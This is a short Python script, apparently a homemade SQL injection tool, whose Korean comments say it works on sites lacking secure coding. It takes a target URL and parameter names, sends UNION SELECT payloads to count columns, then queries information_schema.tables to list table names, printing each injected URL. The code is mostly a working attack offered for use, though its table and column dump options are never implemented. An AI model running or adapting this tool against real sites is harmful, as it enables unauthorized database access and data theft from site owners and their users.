import requests
import sys
import argparse
import time


# Developer:  jimin0605
# Info:       Simple Sqlinjection
# Note:       헤당 도구는 SQL injection에 대한 어떠한 시큐어 코딩이되어있지 않은 사이트에서 사용할 수 있습니다.
#             파라미터의 타입, DB의 종류 에 따라 공격 payload가 조금씩 다르므로
#             코드를 약간 씩 수정해서 사용하는 것을 권장합니다.


def argparser():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', help='The URL to attack ex. http://127.0.0.1', required=True)
    parser.add_argument('-p', '--paramname', nargs='+', help='Vulnerable parameter name', required=True)
    parser.add_argument('-m', '--method', choices=['GET', 'POST'], help='method ex. GET or POST', required=True)
    parser.add_argument('-t', '--tablename', help='Print all records of the corresponding table')
    parser.add_argument('-c', '--colname', nargs='+', help='Print the values corresponding to the specified column')


    args = parser.parse_args()

    return parser.parse_args()


args = argparser()


def GET_count_columns(url, *params):
    param_list = ""

    if len(params) > 1:
        for i in range(1, len(params)):
            param_list += f'&{params[i]}=1' 

    payload = f"?{params[0]}=null union select"

    for i in range(15):
        if i == 0:
            payload += f" {i}"

            res = requests.get(url + payload + "# " + param_list)
            print("[*] Injection...")
            print("[*] "+url + payload + "# " + param_list+"\n")
            if "comment on this picture" in res.text and not("Error" in res.text):
                return i+1
            continue

        payload += f", {i}"

        res = requests.get(url + payload + "# " + param_list)
        print("[*] Injection...")
        print("[*] "+url + payload + "# " + param_list+"\n")
        if "comment on this picture" in res.text and not("Error" in res.text):
            return i+1


def GET_find_table_name(url, col_num, *params):
    param_list = ""

    if len(params) > 1:
        for i in range(1, len(params)):
            param_list += f'&{params[i]}=1'

    payload = f"?{params[0]}=union select table_name"
    for i in range(col_num):
        payload += f", {i}"

    payload += " from information_schema.tables-- -"

    res = requests.get(url+payload+param_list)
    res_list = [url+payload+param_list ,res.text]
    return res_list
        

if args.method == 'GET':
    try:
        col_num = GET_count_columns(args.url, *args.paramname)
        print("[+] Found the number of columns")
        print(f"[+] Column count: {col_num}\n")


    except:
        print("[-] Failed to find the number of columns")
        exit(0)

    table_payload = GET_find_table_name(args.url, col_num, *args.paramname)
    print(f"[+] Table name playload: {table_payload[0]}")
    # print(f"[+] respon text: {table_payload[1]}")
